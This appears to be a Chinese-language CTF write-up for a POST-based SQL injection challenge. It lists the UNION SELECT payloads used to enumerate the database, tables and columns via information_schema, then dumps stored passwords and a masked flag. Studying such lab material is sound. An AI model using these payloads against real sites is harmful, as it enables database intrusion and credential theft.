[Web-CTF](http://120.114.62.45)

# ACTF-SQL Injection資料庫注入攻擊(post)


欄位用select確認一格
'union select 1#要group_concat() 才有database() 原因不明

字串太長會load不出結果

後來發現可以用括號
=`'union(select(database()))#`

### 爆庫

### 爆table name

in:

'union(select(group_concat(table_name))from information_schema.tables where table_schema=database())#

out:

Account:user

### 爆column name

in:

'union(select(group_concat(column_name))from information_schema.columns where table_name=user)#

out:

無

#### 爆column name

in:

'union(select(group_concat(column_name))from information_schema.columns where table_name='user')#

out:

Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routin

### 撈 User(column)

in:

'union(select(User)from user)#

out:

無

### 撈 Host(column)
in:

'union(select(Host)from user)#

out:無

### 撈 Password(column)
in:

'union(select(Passowrd)from user)#

out:

Account:J_password</br>Account:M_password</br>Account:E_password</br>Account:F_password</br>Account:ACTF{*********}
